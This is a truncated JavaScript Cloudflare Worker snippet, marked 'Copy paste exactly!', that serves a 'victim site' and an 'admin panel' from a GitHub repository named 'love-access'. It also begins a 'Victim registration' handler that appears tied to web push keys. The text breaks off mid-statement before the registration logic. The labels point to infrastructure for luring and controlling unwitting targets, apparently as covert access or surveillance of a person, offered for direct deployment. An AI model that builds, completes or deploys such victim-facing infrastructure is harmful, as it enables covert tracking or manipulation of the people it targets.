// Cloudflare Worker - Copy paste exactly!
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const vapidPublicKey = 'YOUR_VAPID_PUBLIC_KEY_HERE'; // Generate below!
    
    // Serve victim site
    if(url.pathname === '/') {
      return fetch('https://YOUR_GITHUB_USERNAME.github.io/love-access/');
    }
    
    // Serve admin panel
    if(url.pathname === '/admin.html') {
      const adminHtml = await fetch('https://raw.githubusercontent.com/YOUR_GITHUB_USERNAME/love-access/main/admin.html');
      return adminHtml;
    }
    
    // Victim registration
    if(request.method
